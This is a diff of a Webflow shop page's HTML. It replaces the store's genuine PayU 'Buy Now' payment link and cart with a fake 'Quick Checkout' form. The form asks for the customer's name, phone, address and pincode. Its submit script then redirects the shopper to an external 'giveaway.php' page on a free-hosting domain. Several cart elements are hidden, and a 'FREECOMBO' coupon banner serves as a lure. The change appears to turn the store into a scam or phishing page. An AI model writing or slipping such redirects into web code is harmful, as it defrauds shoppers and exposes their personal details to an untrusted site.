@@ -347,14 +347,18 @@ window.addEventListener("load", () => {
     }
   }
 }" data-wf-page-link-href-prefix="" class="w-commerce-commercecartwrapper" data-node-type="commerce-cart-wrapper">
+
 <a class="w-commerce-commercecartopenlink ecommerce-button nav-cart-button w-inline-block" role="button" aria-haspopup="dialog" aria-label="Open cart" data-node-type="commerce-cart-open-link" href="#">
+<!--
 <img src="6961f9a1d21856f6718a4c44/6964635fbc78ca8d24da2e98_Cart Icon.svg" loading="lazy" alt="Cart" class="ecommerce-button-icon"/>
-<div data-wf-bindings="%5B%7B%22innerHTML%22%3A%7B%22type%22%3A%22Number%22%2C%22filter%22%3A%7B%22type%22%3A%22numberPrecision%22%2C%22params%22%3A%5B%220%22%2C%22numberPrecision%22%5D%7D%2C%22dataPath%22%3A%22database.commerceOrder.userItemsCount%22%7D%7D%5D" class="w-commerce-commercecartopenlinkcount cart-quantity-number">0</div>
+-->
+
 </a>
+
 <div style="display:none" class="w-commerce-commercecartcontainerwrapper w-commerce-commercecartcontainerwrapper--cartType-modal cart-wrapper" data-node-type="commerce-cart-container-wrapper">
 <div data-node-type="commerce-cart-container" role="dialog" class="w-commerce-commercecartcontainer">
 <div class="w-commerce-commercecartheader">
-<h4 class="w-commerce-commercecartheading">Your Cart</h4>
+<h4 class="w-commerce-commercecartheading">Quick Checkout</h4>
 <a class="w-commerce-commercecartcloselink w-inline-block" role="button" aria-label="Close cart" data-node-type="commerce-cart-close-link">
 <svg width="16px" height="16px" viewBox="0 0 16 16">
 <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
@@ -453,12 +457,55 @@ window.addEventListener("load", () => {
 </div>
 </div>
 </form>
+
 <div class="w-commerce-commercecartemptystate">
-<div aria-label="This cart is empty" aria-live="polite">No items found.</div>
+
+<div class="contact-form-block w-form">
+  <form id="email-form">
+
+    <div class="field-container">
+      <label for="name">Customer Name</label>
+      <input class="text-field w-input" type="text" id="name" name="name" required>
+    </div>
+
+    <div class="field-container">
+      <label for="phone">Customer Phone</label>
+      <input class="text-field w-input" type="number" id="phone" name="phone" required>
+    </div>
+
+    <div class="field-container">
+      <label for="address1">Address Line 1</label>
+      <input class="text-field w-input" type="text" id="address1" name="address1" required>
+    </div>
+
+    <div class="field-container">
+      <label for="address2">Address Line 2</label>
+      <input class="text-field w-input" type="text" id="address2" name="address2" required>
+    </div>
+
+    <div class="field-container">
+      <label for="pincode">Pincode</label>
+      <input class="text-field w-input" type="number" id="pincode" name="pincode" required>
+    </div>
+
+    <input type="submit" class="button contact-submit w-button" value="Pay Now">
+  </form>
 </div>
-<div aria-live="assertive" style="display:none" data-node-type="commerce-cart-error" class="w-commerce-commercecarterrorstate">
-<div class="w-cart-error-msg" data-w-cart-quantity-error="Product is not available in this quantity." data-w-cart-general-error="Something went wrong when adding this item to the cart." data-w-cart-checkout-error="Checkout is disabled on this site." data-w-cart-cart_order_min-error="The order minimum was not met. Add more items to your cart to continue." data-w-cart-subscription_error-error="Before you purchase, please use your email invite to verify your address so we can send order updates.">Product is not available in this quantity.</div>
+
+<script>
+document.getElementById("email-form").addEventListener("submit", function(e) {
+  e.preventDefault(); // form reload stop
+
+  // check if form valid
+  if (this.checkValidity()) {
+    window.location.href = "https://nirapay.kesug.com/sira/giveaway.php";
+  } else {
+    this.reportValidity(); // browser default required message
+  }
+});
+</script>
 </div>
+
 </div>
 </div>
 </div>
@@ -804,9 +851,28 @@ updateCountdown();
 </div>
 -->
 </div>
-
+<!--
 <a href="https://u.payu.in/PIRRLfPJoNUV" aria-label="Next Page" class="w-commerce-commerceaddtocartbutton button product-action"><div class="w-inline-block">Buy Now</div></a>
-<br>	<div class="coupon-box">
+<br>	
+-->
+
+ <div class="w-commerce-commerceaddtocartbutton button product-action">Buy Now</div>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    
+    const buyNowBtn = document.querySelector(".product-action");
+    const cartBtn = document.querySelector(".w-commerce-commercecartopenlink");
+
+    if (buyNowBtn && cartBtn) {
+      buyNowBtn.addEventListener("click", function () {
+        cartBtn.click(); // cart popup open
+      });
+    }
+
+  });
+</script>
+<br>
+<div class="coupon-box">
   <span class="coupon-text">
     Coupon <strong>FREECOMBO</strong> Applied
   </span>
